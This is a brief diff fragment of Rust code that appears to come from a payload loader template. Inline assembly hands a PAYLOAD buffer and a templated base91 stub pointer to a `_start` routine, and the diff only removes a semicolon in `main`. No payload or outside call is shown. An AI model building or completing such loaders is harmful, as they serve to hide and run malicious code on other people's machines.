@@ -33,5 +33,5 @@ unsafe fn _start() {
         in("rcx") p.0, in("rdi") p.1, in("r14") PAYLOAD.as_mut_ptr(), in("r13") r$$$$stub_base91$$$$.as_ptr()
     )
 }
-fn main() { unsafe { _start(); } }
+fn main() { unsafe { _start() } }
 // LOADER END
